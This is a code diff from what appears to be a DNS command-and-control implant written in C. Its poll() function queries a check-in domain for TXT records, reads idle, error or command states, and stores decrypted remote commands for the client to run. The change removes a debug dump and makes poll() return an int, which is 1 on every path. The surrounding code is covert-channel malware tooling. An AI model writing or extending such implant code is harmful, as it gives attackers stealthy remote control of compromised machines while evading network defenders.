@@ -67,7 +67,6 @@ char *request_hex_to_string(const char *in) {
     // decrypt
     char clear[gz_bytes_len];
     size_t clear_len = decrypt(gz_bytes, gz_bytes_len, clear);
-    hex_dump("clear", clear, clear_len);
 
     // decode json
     char *c = calloc(255, sizeof(char *));
@@ -133,7 +132,7 @@ int send_response(client_t *client, char **data, int data_count) {
 }
 
 
-void poll(client_t *client) {
+int poll(client_t *client) {
 
     u_char answer[255]; // a single TXT response string is max 255
     char txt[255];
@@ -144,31 +143,31 @@ void poll(client_t *client) {
     len = res_query(client->checkin_domain, ns_c_in, ns_t_txt, answer, sizeof(answer));
 
     if (len <= 0)
-        return;
+        return 1;
 
     if (ns_initparse(answer, len, &msg) < 0)
-        return;
+        return 1;
 
     if (ns_msg_count(msg, ns_s_an) > 1)
         Dprintf("[d] dns response had more than 1 answers. we are only taking the first\n");
 
     if (ns_parserr(&msg, ns_s_an, 0, &rr)) // take the first rr, 0
-        return;
+        return 1;
 
     if (ns_rr_type(rr) != ns_t_txt)
-        return;
+        return 1;
 
     // first byte seems to be a size byte maybe?
     strncpy(txt, (char *) ns_rr_rdata(rr) + 1, ns_rr_rdlen(rr));
 
     if (strstr(txt, resp_idle) != NULL) {
         client->status = Idle;
-        return;
+        return 1;
     }
 
     if (strstr(txt, resp_error) != NULL) {
         client->status = Error;
-        return;
+        return 1;
     }
 
     if (strstr(txt, resp_cmd) != NULL) {
@@ -176,7 +175,7 @@ void poll(client_t *client) {
         if (strstr(txt, ",p=") == NULL) {
             // something is wrong, lets ignore that response
             client->status = Idle;
-            return;
+            return 1;
         }
 
         // when we're in a cmd state, we are expecting the bytes
@@ -201,6 +200,8 @@ void poll(client_t *client) {
         client->command = c;
         client->status = Command;
     }
+
+    return 1;
 }
 
 /*
